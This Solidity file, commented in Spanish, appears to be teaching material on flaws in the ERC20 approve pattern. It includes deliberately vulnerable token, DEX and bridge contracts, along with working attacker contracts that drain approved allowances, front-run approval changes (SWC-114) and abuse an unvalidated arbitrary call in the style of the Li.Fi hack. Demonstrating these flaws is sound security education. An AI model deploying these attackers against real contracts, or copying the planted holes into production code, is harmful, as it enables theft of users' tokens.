// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title ERC20 Approval Problems
 * @notice Demuestra los problemas fundamentales del patrón approve()
 *
 * PROBLEMAS DEMOSTRADOS:
 * 1. Infinite approvals (mayoría de dApps)
 * 2. SWC-114: Multiple Withdrawal Attack (race condition)
 * 3. No hay expiración de approvals
 * 4. Riesgo de contratos maliciosos/comprometidos
 */

// ═══════════════════════════════════════════════════════════════════════
// PROBLEMA 1: Token ERC20 Básico (permite infinite approvals)
// ═══════════════════════════════════════════════════════════════════════

contract VulnerableERC20 {
    string public name = "Vulnerable Token";
    string public symbol = "VULN";
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(uint256 _initialSupply) {
        totalSupply = _initialSupply;
        balanceOf[msg.sender] = _initialSupply;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    // ⚠️ VULNERABLE: Permite infinite approvals
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");

        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        emit Transfer(from, to, amount);
        return true;
    }
}

// ═══════════════════════════════════════════════════════════════════════
// PROBLEMA 2: DEX que pide infinite approval (común en producción)
// ═══════════════════════════════════════════════════════════════════════

contract NaiveDEX {
    VulnerableERC20 public token;

    constructor(address _token) {
        token = VulnerableERC20(_token);
    }

    // Simula un swap (1:1 ratio para simplicidad)
    function swap(uint256 amount) external {
        // ⚠️ Usa transferFrom() - requiere approval previa
        token.transferFrom(msg.sender, address(this), amount);

        // Simula dar tokens de vuelta (en realidad sería otro token)
        token.transfer(msg.sender, amount);
    }

    // Frontend típicamente hace esto:
    // token.approve(dexAddress, type(uint256).max)  // ∞ approval
}

// ═══════════════════════════════════════════════════════════════════════
// ATAQUE 1: Contrato malicioso que drena fondos
// ═══════════════════════════════════════════════════════════════════════

contract MaliciousDEX {
    VulnerableERC20 public token;

    constructor(address _token) {
        token = VulnerableERC20(_token);
    }

    // Se ve legítimo...
    function swap(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        // "Procesando swap..."
    }

    // ⚠️ ATAQUE: Owner puede drenar todos los fondos aprobados
    function drainApprovals(address victim) external {
        uint256 allowedAmount = token.allowance(victim, address(this));
        if (allowedAmount > 0) {
            token.transferFrom(victim, msg.sender, allowedAmount);
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════
// ATAQUE 2: SWC-114 Multiple Withdrawal (Race Condition)
// ═══════════════════════════════════════════════════════════════════════

contract ApprovalRaceAttacker {
    VulnerableERC20 public token;
    address public victim;
    bool public attackExecuted;

    constructor(address _token, address _victim) {
        token = VulnerableERC20(_token);
        victim = _victim;
    }

    // Simula el ataque SWC-114
    function executeRaceAttack() external {
        // Escenario:
        // 1. Víctima aprobó 100 tokens a este contrato
        // 2. Víctima quiere cambiar a 50 tokens (nueva tx)
        // 3. Este contrato ve la tx en mempool y front-runs

        uint256 currentAllowance = token.allowance(victim, address(this));
        require(currentAllowance > 0, "No allowance");

        // ⚠️ Gasta los tokens ANTES de que la víctima cambie el approval
        token.transferFrom(victim, address(this), currentAllowance);

        // Ahora cuando la víctima cambie a 50, este contrato tiene otros 50
        // Total extraído: 100 + 50 = 150 tokens!
        attackExecuted = true;
    }

    // Retira los tokens robados
    function withdraw() external {
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}

// ═══════════════════════════════════════════════════════════════════════
// ATAQUE 3: Simula Li.Fi-style hack (función vulnerable en bridge)
// ═══════════════════════════════════════════════════════════════════════

contract VulnerableBridge {
    // Simula un bridge que tiene función vulnerable

    // ⚠️ VULNERABLE: Permite call arbitrarios (similar a Li.Fi hack)
    function bridgeAndSwap(
        address token,
        address target,
        bytes calldata data
    ) external {
        // Intenta hacer un swap antes de bridge
        // ⚠️ NO valida el target!
        (bool success, ) = target.call(data);
        require(success, "Call failed");
    }
}

contract LiFiStyleAttacker {
    VulnerableERC20 public token;
    VulnerableBridge public bridge;

    constructor(address _token, address _bridge) {
        token = VulnerableERC20(_token);
        bridge = VulnerableBridge(_bridge);
    }

    function attack(address victim) external {
        // Construye un call a transferFrom()
        bytes memory data = abi.encodeWithSelector(
            token.transferFrom.selector,
            victim,          // from (víctima que tiene approval al bridge)
            address(this),   // to (atacante)
            token.allowance(victim, address(bridge))  // amount
        );

        // ⚠️ Abusa de la función vulnerable del bridge
        bridge.bridgeAndSwap(
            address(token),
            address(token),  // target = token contract!
            data             // data = transferFrom(victim, attacker, balance)
        );
    }

    function withdraw() external {
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}

// ═══════════════════════════════════════════════════════════════════════
// HELPER: Función para testing
// ═══════════════════════════════════════════════════════════════════════

contract ApprovalHelper {
    // Simula comportamiento común de usuarios
    function approveInfinite(address token, address spender) external {
        VulnerableERC20(token).approve(spender, type(uint256).max);
    }

    function approveAmount(address token, address spender, uint256 amount) external {
        VulnerableERC20(token).approve(spender, amount);
    }

    // Simula cambio de approval (vulnerable a race condition)
    function changeApproval(
        address token,
        address spender,
        uint256 oldAmount,
        uint256 newAmount
    ) external {
        // ⚠️ VULNERABLE: No hace approve(spender, 0) primero
        VulnerableERC20(token).approve(spender, newAmount);
    }
}
